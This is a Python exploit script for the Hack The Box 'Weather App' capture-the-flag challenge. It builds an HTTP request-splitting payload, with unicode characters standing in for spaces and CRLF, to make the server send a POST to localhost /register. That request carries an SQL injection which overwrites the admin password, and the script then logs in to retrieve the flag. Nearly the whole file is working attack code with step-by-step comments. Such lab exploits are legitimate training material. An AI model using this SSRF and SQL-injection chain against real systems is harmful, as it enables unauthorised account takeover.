import argparse

import requests

from sys import exit


def run_hack() -> bool:
    # We know there is a SQL non parameterized query on the /register function database.js#32
    # We will `change` the current password to whatevery we set as `args.password`
    password = f"') ON CONFLICT (username) DO UPDATE SET password = '{args.password}';--"

    # The image is using Node 8.12.0 (Dockerfile#1) which is vulnerable to a HTTP Splitting vulnerability
    # Reference: https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/
    # We need to ensure the password doesn't have any of these special characters. It is
    # because of this that we can use urllib.parse.quote()
    hack = {
        "space": {"orig": " ", "new": "\u0120"},
        "new_line": {"orig": "\r\n", "new": "\u010D\u010A"},
        "single_quote": {"orig": "'", "new": "%27",},  # This is not a hack but I can't use urllib.parse.quote because it messes up the hack
    }

    # Formatting the password to work with the hack
    for i in hack.values():
        password = password.replace(i["orig"], i["new"])

    payload = f"username={user}&password={password}"
    content_length = len(payload)

    # We now need to bypass the localhost POST restriction found in routes/index.js#21 
    # using the exploit above

    # This section will change the endpoint from api.openweather.com to localhost and 
    # start a new connection using the exploit. This piece will start us off with 
    # a connection to localhost on the server
    endpoint_new = f"127.0.0.1/{hack['space']['new']}HTTP/1.1{hack['new_line']['new']}"

    # This section will create a POST to /register with the SQLi
    endpoint_new += f"{hack['new_line']['new']}POST{hack['space']['new']}/register"
    endpoint_new += f"{hack['space']['new']}HTTP/1.1{hack['new_line']['new']}"
    
    # RFC for HTTP version 1.1 requires a Host to be set. Using localhost as all systems
    # will resolve to that.
    endpoint_new += f"Host:{hack['space']['new']}localhost{hack['new_line']['new']}"
    
    # The request expects a form post, which is why we add it here
    endpoint_new += f"Content-Type:{hack['space']['new']}application/x-www-form-urlencoded{hack['new_line']['new']}"
    
    # RFC for HTTP requires a content-length be set as the size of the payload
    endpoint_new += f"Content-Length:{hack['space']['new']}{content_length}"
    
    # RFC for HTTP requires that the first \r\n\r\n will be the separation between the 
    # headers and the payload
    endpoint_new += f"{hack['new_line']['new']}{hack['new_line']['new']}{payload}"

    # This section will send a follow on GET to complete the session
    endpoint_new += f"GET{hack['space']['new']}"

    # Now to make the web request to the vulnerable URL passing in the exploit via the 
    # "endpoint" key.
    response = requests.post(
        f"{base_url}/api/weather",
        json={"endpoint": endpoint_new, "city": "Tbilisi", "country": "GE"},
        headers={"Connection": "close"},
    )
    if response.status_code != 200:
        print(f"[!] Exploit failed, recieved status_code '{response.status_code}'")
        print(response.text)
        return False
    else:
        print("[?] Exploit might have worked, let's try logging in with the following:")
        print(f"\turl: {base_url}/login")
        print(f"\tusername: {user}")
        print(f"\tpassword: {args.password}")
        return True


def login() -> bool:
    # Based off the code, we should be able to login as admin and get the flag
    # Reference: routes/index.js#46
    headers = {
        "Accept": "*/*",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    payload = f"username={user}&password={args.password}"

    response = requests.post(f"{base_url}/login", headers=headers, data=payload)
    if response.status_code != 200:
        print("[!] Failed to login, you should investigate.")
        return False
    elif response.text.startswith("HTB"):
        print(f"[+] Exploit successful, flag is {response.text}")
        return True
    else:
        print("Recieved an error response:")
        print(f"\t{response.text}")
        return False


if __name__ == "__main__":
    parser = argparse.ArgumentParser("Exploit for HTB Weather App")
    parser.add_argument("-p", "--password", required=True, help="new password to set for admin")
    parser.add_argument("-H", "--host", required=True, help="this is the host/ip to exploit")
    parser.add_argument("-P", "--port", required=True, help="this is the port to exploit")
    args = parser.parse_args()

    base_url = f"http://{args.host}:{args.port}"

    # We know this is the default user from the source code database.js#24
    user = "admin"

    if not run_hack():
        exit(-1)  # We were not able to craft the exploit correctly
    elif not login():
        exit(-2)  # We were not able to login for some reason
    else:
        exit(0)  # Everything worked
